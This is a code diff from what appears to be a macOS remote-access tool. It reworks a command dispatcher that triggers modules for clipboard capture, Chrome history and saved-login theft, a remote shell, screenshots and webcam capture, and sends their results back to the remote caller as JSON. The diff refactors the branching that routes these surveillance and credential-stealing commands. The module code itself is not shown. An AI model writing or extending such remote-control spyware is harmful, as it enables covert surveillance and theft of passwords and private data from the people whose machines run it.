@@ -17,7 +17,7 @@ from modules import mod_screenshot
 from modules import mod_webcam
 
 reMacModules = {
-    'helloWorld': mod_hello.mod_hello(),
+    'hw': mod_hello.mod_hello(),
     'cb': mod_clipboard.mod_clipboard(),
     'ch': mod_chrome_history.mod_chrome_history(),
     'cl': mod_chrome_logins.mod_chrome_logins(),
@@ -95,20 +95,25 @@ class Message:
         elif input == "h":  # or input == "help":
             # print_help()
             pass
-        elif input == "helloWorld" \
+        elif input == "hw" \
                 or input == "cb" \
-                or input == "ch":  # or input == "help":
+                or input == "ch" \
+                or input == "cl" \
+                or input == "sh" \
+                or input == "sc" \
+                or input == "wc" \
+                or input == "d":  # or input == "help":
             return reMacModules[input].run_mod()
-        elif input == "cl":  # or input == "chromeLogins":
-            reMacModules[input].run_mod()
-        elif input == "sh":  # or input == "shell":
-            reMacModules[input].run_mod()
-        elif input == "sc":  # or input == "screenshot":
-            reMacModules[input].run_mod()
-        elif input == "wc":  # or input == "screenshot":
-            reMacModules[input].run_mod()
-        elif input == "d" or input == "dev":
-            reMacModules['sc'].run_mod()
+        # elif input == "cl":  # or input == "chromeLogins":
+        #     reMacModules[input].run_mod()
+        # elif input == "sh":  # or input == "shell":
+        #     reMacModules[input].run_mod()
+        # elif input == "sc":  # or input == "screenshot":
+        #     reMacModules[input].run_mod()
+        # elif input == "wc":  # or input == "screenshot":
+        #     reMacModules[input].run_mod()
+        # elif input == "d" or input == "dev":
+        #     reMacModules['sc'].run_mod()
         else:
             print(f"Command '{input}' NOT FOUND! Check the following command list")
             # print_help()
@@ -129,15 +134,17 @@ class Message:
 
     def _create_response_json_content(self):
         action = self.request.get("action")
-        if action == "helloWorld":
-            answer = self.processInput(action) #f'HelloWorld action called!!!'
+        if action == "hw" \
+                or action == "cb" \
+                or action == "ch":
+            answer = self.processInput(action)
             content = {"action": action, "result": answer}
-        elif action == "cb":
-            answer = self.processInput(action)  # f'HelloWorld action called!!!'
-            content = {"action": action, "result": answer}
-        elif action == "ch":
-            answer = self.processInput(action)  # f'HelloWorld action called!!!'
-            content = {"action": action, "result": answer}
+        # elif action == "cb":
+        #     answer = self.processInput(action)  # f'HelloWorld action called!!!'
+        #     content = {"action": action, "result": answer}
+        # elif action == "ch":
+        #     answer = self.processInput(action)  # f'HelloWorld action called!!!'
+        #     content = {"action": action, "result": answer}
         else:
             content = {"action": action, "result": f'Error: invalid action "{action}".'}
         content_encoding = "utf-8"
